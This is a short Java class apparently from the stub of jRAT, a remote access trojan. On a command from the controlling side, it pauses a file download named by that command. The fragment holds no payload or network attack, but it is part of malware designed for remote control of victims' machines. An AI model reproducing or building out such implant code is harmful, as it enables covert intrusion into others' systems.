package io.jrat.stub.packets.incoming;

import io.jrat.common.io.FileCache;
import io.jrat.stub.Connection;

public class Packet102PauseClientDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		
		FileCache.get(file).getRunnable().pause();
	}

}
